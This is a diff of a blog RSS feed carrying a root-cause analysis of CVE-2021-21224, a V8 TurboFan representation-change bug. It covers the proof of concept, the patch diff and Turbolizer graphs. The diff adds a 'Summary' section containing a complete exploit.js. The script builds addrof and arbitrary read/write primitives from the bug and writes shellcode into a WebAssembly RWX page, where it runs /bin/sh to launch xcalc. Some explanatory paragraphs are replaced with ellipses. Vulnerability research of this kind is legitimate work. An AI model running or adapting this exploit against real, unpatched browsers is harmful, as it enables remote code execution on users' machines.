@@ -1,10 +1,10 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>chromium on Anvbis</title><link>https://anvbis.github.io/tags/chromium/</link><description>Recent content in chromium on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Tue, 06 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/tags/chromium/index.xml" rel="self" type="application/rss+xml"/><item><title>Root Cause Analysis of CVE-2021-21224</title><link>https://anvbis.github.io/posts/root-cause-analysis-of-cve-2021-21224/</link><pubDate>Tue, 06 Dec 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/root-cause-analysis-of-cve-2021-21224/</guid><description>1. Overview An incorrect optimization in TurboFan&amp;rsquo;s representation changer results in Int64 values being erroneously truncated to Int32 values.
 I figured this bug would be a great way to further explore TurboFan&amp;rsquo;s simplified lowering phase, and learn more about representation change internals.
-You can find the related chromium bug report here.
+You can find the relevant chromium bug report here.
 2. Proof of Concept Below is the proof-of-concept that was provided in the original issue. I&amp;rsquo;ve reformatted it a little in order to make it a bit more readable, but the code is the same.</description><content>&lt;h2 id="1-overview">1. Overview&lt;/h2>
 &lt;p>An incorrect optimization in TurboFan&amp;rsquo;s representation changer results in Int64 values being erroneously truncated to Int32 values.&lt;/p>
 &lt;p>I figured this bug would be a great way to further explore TurboFan&amp;rsquo;s simplified lowering phase, and learn more about representation change internals.&lt;/p>
-&lt;p>You can find the related chromium bug report &lt;a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1195777">here&lt;/a>.&lt;/p>
+&lt;p>You can find the relevant chromium bug report &lt;a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1195777">here&lt;/a>.&lt;/p>
 &lt;h2 id="2-proof-of-concept">2. Proof of Concept&lt;/h2>
 &lt;p>Below is the proof-of-concept that was provided in the original issue. I&amp;rsquo;ve reformatted it a little in order to make it a bit more readable, but the code is the same.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">/* supplied_poc.js */&lt;/span>
@@ -39,9 +39,11 @@ You can find the related chromium bug report here.
 &lt;p>My initial assumption is that bug is actually due to an incorrect optimization in the comparison operator (as TurboFan effectively optimizes the &lt;code>Math.max()&lt;/code> call to an &lt;code>Int64LessThan&lt;/code> node) rather than an incorrect optimization in the left shift operator.&lt;/p>
 &lt;p>While I might be completely wrong, it&amp;rsquo;s definitely a topic that requires further investigation.&lt;/p>
 &lt;h2 id="3-patch-implementation-details">3. Patch Implementation Details&lt;/h2>
+&lt;p>&amp;hellip;&lt;/p>
 &lt;pre>&lt;code>[compiler] Fix bug in RepresentationChanger::GetWord32RepresentationFor
 We have to respect the TypeCheckKind.
-&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">diff --git a/src/compiler/representation-change.cc b/src/compiler/representation-change.cc
+&lt;/code>&lt;/pre>&lt;p>&amp;hellip;&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">diff --git a/src/compiler/representation-change.cc b/src/compiler/representation-change.cc
 index 64b274c..3d937ad 100644
 &lt;span style="color:#f92672">--- a/src/compiler/representation-change.cc
 &lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+++ b/src/compiler/representation-change.cc
@@ -60,7 +62,8 @@ if (output_type.Is(Type::Signed32()) ||
 &lt;/span>&lt;span style="color:#a6e22e">&lt;/span> op = machine()-&amp;gt;TruncateInt64ToInt32();
 } else if (use_info.type_check() == TypeCheckKind::kSignedSmall ||
 use_info.type_check() == TypeCheckKind::kSigned32 ||
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c++" data-lang="c++">Node&lt;span style="color:#f92672">*&lt;/span> RepresentationChanger&lt;span style="color:#f92672">::&lt;/span>GetWord32RepresentationFor(
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c++" data-lang="c++">Node&lt;span style="color:#f92672">*&lt;/span> RepresentationChanger&lt;span style="color:#f92672">::&lt;/span>GetWord32RepresentationFor(
 &lt;span style="color:#66d9ef">const&lt;/span> Operator&lt;span style="color:#f92672">*&lt;/span> op &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">nullptr&lt;/span>;
 &lt;span style="color:#75715e">/* ... */&lt;/span>
 } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#a6e22e">if&lt;/span> (output_rep &lt;span style="color:#f92672">==&lt;/span> MachineRepresentation&lt;span style="color:#f92672">::&lt;/span>kWord64) {
@@ -77,10 +80,12 @@ op &lt;span style="color:#f92672">=&lt;/span> machine()&lt;span style="color:#f9
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Why is the representation change occurring in the first place? What is &lt;code>TypeCheckKind&lt;/code> and why does it need to be kNone in order to be safe?&lt;/p>
 &lt;h1 id="4-comparing-turbolizer-graphs">4. Comparing Turbolizer Graphs&lt;/h1>
+&lt;p>&amp;hellip;&lt;/p>
 &lt;figure class="left" >
 &lt;img src="https://anvbis.github.io/img/20221206/turbolizer-1.png" alt="turbolizer-1.png" />
 &lt;figcaption class="center" >Figure 1: Vulnerable turbolizer graph.&lt;/figcaption>
 &lt;/figure>
+&lt;p>&amp;hellip;&lt;/p>
 &lt;figure class="left" >
 &lt;img src="https://anvbis.github.io/img/20221206/turbolizer-2.png" alt="turbolizer-2.png" />
 &lt;figcaption class="center" >Figure 2: Patched turbolizer graph.&lt;/figcaption>
@@ -88,11 +93,98 @@ op &lt;span style="color:#f92672">=&lt;/span> machine()&lt;span style="color:#f9
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c++" data-lang="c++"> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#a6e22e">if&lt;/span> (&lt;span style="color:#75715e">/* ... */&lt;/span>
 output_type.Is(Type&lt;span style="color:#f92672">::&lt;/span>Unsigned32()) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>
 use_info.type_check() &lt;span style="color:#f92672">==&lt;/span> TypeCheckKind&lt;span style="color:#f92672">::&lt;/span>kNone &lt;span style="color:#75715e">/* ... */&lt;/span>) {
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>But in our case, as &lt;code>use_info.type_check()&lt;/code> is kSigned32 rather than kNone, we fail the added check.&lt;/p>
-&lt;p>So instead, our input is passed on to the following code that checks whether the output is a kPositiveSafeInteger, which it is, before being converted to a &lt;code>CheckUint64ToInt32&lt;/code> node, rather than a &lt;code>TruncateInt64ToInt32&lt;/code> node.&lt;/p>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>In our case, as &lt;code>use_info.type_check()&lt;/code> is kSigned32 rather than kNone, we fail the added check.&lt;/p>
+&lt;p>So instead, our input is passed on to the following code that checks whether the output is a kPositiveSafeInteger, which it is, before being converted to a &lt;code>CheckedUint64ToInt32&lt;/code> node, rather than a &lt;code>TruncateInt64ToInt32&lt;/code> node.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c++" data-lang="c++"> &lt;span style="color:#66d9ef">if&lt;/span> (output_type.Is(cache_&lt;span style="color:#f92672">-&amp;gt;&lt;/span>kPositiveSafeInteger)) {
 op &lt;span style="color:#f92672">=&lt;/span> simplified()&lt;span style="color:#f92672">-&amp;gt;&lt;/span>CheckedUint64ToInt32(use_info.feedback());
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="references">References&lt;/h2>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="5-summary">5. Summary&lt;/h1>
+&lt;p>&amp;hellip;&lt;/p>
+&lt;div class="collapsable-code">
+&lt;input id="1" type="checkbox" checked />
+&lt;label for="1">
+&lt;span class="collapsable-code__language">js&lt;/span>
+&lt;span class="collapsable-code__title">exploit.js&lt;/span>
+&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
+&lt;/label>
+&lt;pre class="language-js" >&lt;code>
+let bs = new ArrayBuffer(8);
+let fs = new Float64Array(bs);
+let is = new BigUint64Array(bs);
+const ftoi = x =&amp;gt; {
+fs[0] = x;
+return is[0];
+}
+const itof = x =&amp;gt; {
+is[0] = x;
+return fs[0];
+}
+function foo(a) {
+let x = 0xffffffff;
+if (a) x = -1;
+let z = Math.max(0, x);
+z = 0 - z;
+z = Math.sign(z);
+let cor = new Array(z);
+cor.shift();
+let oob = [1.1, 2.2, 3.3];
+return { cor, oob };
+}
+for (let i = 0; i &amp;lt; 100000; i&amp;#43;&amp;#43;)
+foo(true);
+let { cor, oob } = foo(false);
+cor[16] = 1337;
+/* flt.elements @ oob[10] (upper) */
+/* obj.elements @ oob[22] (upper) */
+let flt = [1.1];
+let tmp = {a: 1};
+let obj = [tmp];
+function addrof(o) {
+let a = ftoi(oob[22]) &amp;gt;&amp;gt; 32n;
+let b = ftoi(oob[10]) &amp;amp; 0xffffffffn;
+oob[10] = itof((a &amp;lt;&amp;lt; 32n) &amp;#43; b);
+obj[0] = o;
+return (ftoi(flt[0]) &amp;amp; 0xffffffffn) - 1n;
+}
+function read(p) {
+let a = ftoi(oob[10]) &amp;amp; 0xffffffffn;
+oob[10] = itof(((p - 8n &amp;#43; 1n) &amp;lt;&amp;lt; 32n) &amp;#43; a);
+return ftoi(flt[0]);
+}
+function write(p, x) {
+let a = ftoi(oob[10]) &amp;amp; 0xffffffffn;
+oob[10] = itof(((p - 8n &amp;#43; 1n) &amp;lt;&amp;lt; 32n) &amp;#43; a);
+flt[0] = itof(x);
+}
+let wasm = new Uint8Array([
+0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x85, 0x80, 0x80, 0x80,
+0x00, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80, 0x00, 0x01,
+0x00, 0x04, 0x84, 0x80, 0x80, 0x80, 0x00, 0x01, 0x70, 0x00, 0x00, 0x05, 0x83,
+0x80, 0x80, 0x80, 0x00, 0x01, 0x00, 0x01, 0x06, 0x81, 0x80, 0x80, 0x80, 0x00,
+0x00, 0x07, 0x91, 0x80, 0x80, 0x80, 0x00, 0x02, 0x06, 0x6d, 0x65, 0x6d, 0x6f,
+0x72, 0x79, 0x02, 0x00, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00, 0x0a, 0x8a,
+0x80, 0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80, 0x00, 0x00, 0x41, 0x2a,
+0x0b
+]);
+let module = new WebAssembly.Module(wasm);
+let instance = new WebAssembly.Instance(module);
+let rwx = read(addrof(instance) &amp;#43; 0x68n);
+/* DISPLAY=&amp;#39;:0.0&amp;#39; xcalc */
+let shellcode = new Uint8Array([
+0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x99, 0x50, 0x54,
+0x5f, 0x52, 0x66, 0x68, 0x2d, 0x63, 0x54, 0x5e, 0x52, 0xe8, 0x15, 0x00, 0x00,
+0x00, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x27, 0x3a, 0x30, 0x2e,
+0x30, 0x27, 0x20, 0x78, 0x63, 0x61, 0x6c, 0x63, 0x00, 0x56, 0x57, 0x54, 0x5e,
+0x6a, 0x3b, 0x58, 0x0f, 0x05
+]);
+let buf = new ArrayBuffer(shellcode.length);
+let view = new DataView(buf);
+write(addrof(buf) &amp;#43; 0x14n, rwx);
+for (let i = 0; i &amp;lt; shellcode.length; i&amp;#43;&amp;#43;)
+view.setUint8(i, shellcode[i]);
+instance.exports.main();
+&lt;/code>&lt;/pre>
+&lt;/div>
+&lt;h2 id="references">References&lt;/h2>
 &lt;ul>
 &lt;li>&lt;a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1195777">Issue 1195777: Incorrect representation change from Word64 to Word32&lt;/a>&lt;/li>
 &lt;/ul></content></item><item><title>Code Execution in Chromium's V8 Heap Sandbox</title><link>https://anvbis.github.io/posts/code-execution-in-chromiums-v8-heap-sandbox/</link><pubDate>Sun, 27 Nov 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/code-execution-in-chromiums-v8-heap-sandbox/</guid><description>1. Overview The V8 heap sandbox has been around for quite some time now, and while it initially broke several methods used to gain code execution (looking at you, wasm shellcode), new methods have risen to take their place.
